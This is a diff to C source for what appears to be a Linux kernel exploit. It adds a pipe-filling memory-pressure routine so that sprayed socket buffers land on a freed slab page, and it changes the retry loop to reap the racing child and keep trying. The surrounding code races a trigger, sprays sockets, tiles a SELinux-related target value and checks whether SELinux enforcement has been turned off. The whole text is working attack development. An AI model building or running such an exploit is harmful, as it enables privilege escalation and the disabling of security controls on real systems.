@@ -102,6 +102,31 @@ static int child_race(void)
     if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(114);
     for (;;) pause();
 }
+static int g_pres[128][2];
+static int g_npres;
+
+static int hold_pressure(int mb)
+{
+    char buf[65536];
+    int i;
+    memset(buf, 0x5a, sizeof(buf));
+    for (i = 0; i < mb && i < 128; i++) {
+        int p[2];
+        if (pipe(p) != 0) break;
+        if (fcntl(p[1], F_SETPIPE_SZ, 1024 * 1024) <= 0) { close(p[0]); close(p[1]); break; }
+        {
+            int k, ok = 1;
+            for (k = 0; k < 16; k++)
+                if (write(p[1], buf, sizeof(buf)) != (ssize_t)sizeof(buf)) { ok = 0; break; }
+            if (!ok) { close(p[0]); close(p[1]); break; }
+        }
+        g_pres[g_npres][0] = p[0];
+        g_pres[g_npres][1] = p[1];
+        g_npres++;
+    }
+    return g_npres;
+}
+
 static void *sprayer(void *arg) { (void)arg;
     while (!atomic_load(&g_spray_stop) && g_nsocks < MAX_SOCKS) {
         int sv[2];
@@ -166,7 +191,10 @@ int main(int argc, char **argv)
       for (off = 8; off + 24 <= sizeof(g_pat); off += 24)
           *(uint64_t *)(g_pat + off + 16) = SELINUX_MINUS7;
       printf("tiling phase=8, first node at +0x8, last at +0x%zx\n", off - 24); }
-    printf("=== join: trigger + spray + PFN gate, target=%#llx ===\n", (unsigned long long)SELINUX_MINUS7);
+    printf("=== join: trigger + pressure + spray + PFN gate, target=%#llx ===\n", (unsigned long long)SELINUX_MINUS7);
+    /* Without memory pressure alloc_skb_with_frags hands out order-3 pages, so
+     * our 8 KiB records never land on the order-1 slab page we freed. */
+    printf("pressure: %d MiB held\n", hold_pressure(63));
     wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_free\n");
     wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_alloc\n");
     wf(T "/buffer_size_kb", "16384\n");
@@ -202,8 +230,11 @@ int main(int argc, char **argv)
                   if (fd >= 0) { if (read(fd, b, 1) > 0) { printf("    enforce=%c\n", b[0]); fflush(stdout); } close(fd); }
                   else { printf("    enforce unreadable\n"); fflush(stdout); } }
             } else {
-                printf("    NOT claimed -> parking to protect the zombie\n"); fflush(stdout);
-                for (;;) pause();
+                /* Nothing of ours sits in the freed pages this round, so reaping
+                 * is the same risk as before. Do it now and keep going so we can
+                 * reach a round that does claim. */
+                { int s2; waitpid(child, &s2, 0); }
+                printf("    NOT claimed -> reaped anyway, continuing\n"); fflush(stdout);
             }
         }
         { int h, n = g_sh ? atomic_load(&g_sh->nhelpers) : 0;
